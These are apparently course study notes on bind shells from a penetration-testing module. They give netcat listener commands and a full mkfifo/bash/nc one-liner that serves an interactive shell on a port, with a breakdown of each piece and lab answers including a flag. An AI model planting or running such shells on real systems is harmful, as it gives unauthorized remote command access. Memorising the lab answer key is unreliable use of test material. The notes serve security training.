# NOTE — Bind Shells

## ID
24

## Module
Shells & Payloads

## Kind
notes

## Title
Section 4 — Bind Shells

## Description
Bind shell = target opens a listener and waits; attacker connects in. Walks through netcat-based bind shell construction with FIFO/mkfifo plumbing, and why bind shells fail against modern firewalled targets.

## Tags
bind-shell, netcat, mkfifo, fifo, pipes, listener, ports

## Commands
- `nc -lvnp 7777` — target starts listener (verbose, no-DNS, port)
- `nc -nv <target-ip> 7777` — attacker connects to listener
- `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ip> 7777 > /tmp/f` — full bind-shell one-liner serving Bash over nc

## What This Section Covers
With a **bind shell**, the target hosts the listener and the attacker initiates the TCP connection. This requires the listener already running on the target *and* inbound traffic allowed at the firewall — both rare in real engagements. Useful conceptually and inside internal networks where outbound is locked down but lateral inbound works.

## Bind vs Reverse — Direction of Connection
| Type | Listener | Connector |
|------|----------|-----------|
| **Bind** | Target | Attacker |
| **Reverse** | Attacker | Target |

## Why Bind Shells Fail In The Wild
- Listener needs to already be running on target.
- NAT/PAT on perimeter blocks inbound from the internet.
- OS firewalls (Windows Defender Firewall, ufw, iptables) block unknown inbound.
- Easier to detect — incoming connections are inherently more suspicious than outgoing.

## Building a Bind Shell with Netcat (Plain TCP)
This only pipes text — *not* a shell:
```shellsession
# Target
nc -lvnp 7777
# Attacker
nc -nv <target-ip> 7777
```

## Real Bind Shell with mkfifo (Bash via Netcat)
The "real" bind shell uses a FIFO named-pipe to wire stdin/stdout/stderr between `bash -i` and `nc`:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target-ip> 7777 > /tmp/f
```

### Pipeline breakdown
| Piece | Purpose |
|-------|---------|
| `rm -f /tmp/f;` | Remove old FIFO if present |
| `mkfifo /tmp/f;` | Create the named pipe |
| `cat /tmp/f \|` | Read from FIFO → bash stdin |
| `/bin/bash -i 2>&1 \|` | Interactive bash, merge stderr into stdout |
| `nc -l <ip> 7777 > /tmp/f` | Listen on port; write incoming bytes back into FIFO |

The FIFO closes the loop: attacker types → nc → FIFO → bash stdin → bash output → nc → attacker.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Des runs `nc -lvnp 443` on Linux. What port does her attack box connect to? | **443** | `-l` means *target is listening*; attacker connects to whichever port the listener is bound to. |
| Q2 — SSH in, create a bind shell, then read `/customscripts/flag.txt` | **B1nD_Shells_r_cool** | `ssh htb-student@<ip>` → run mkfifo+nc bind one-liner → from Pwnbox `nc -nv <ip> 7777` → `cat /customscripts/flag.txt`. |

## Key Takeaways
- A plain `nc` listener only passes text — you need the FIFO+bash plumbing for a real shell.
- Bind shells are mostly conceptual on external tests — they shine *inside* the network when egress is filtered but east-west is open.
- The listener side is the *server*; the connector side is the *client*. Mixed up = no shell.

## Gotchas
- `nc -l <ip> <port>` binds to a *specific* interface — wrong IP = silent failure. Drop the IP to listen on all interfaces.
- Forgetting to clear `/tmp/f` between attempts → stale FIFO blocks the listener.
- `-i` is mandatory for an interactive bash — without it commands run but the prompt is dead.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|shells-payloads]]
← [[03-anatomy-of-a-shell]] | [[05-reverse-shells]] →
<!-- AUTO-LINKS-END -->
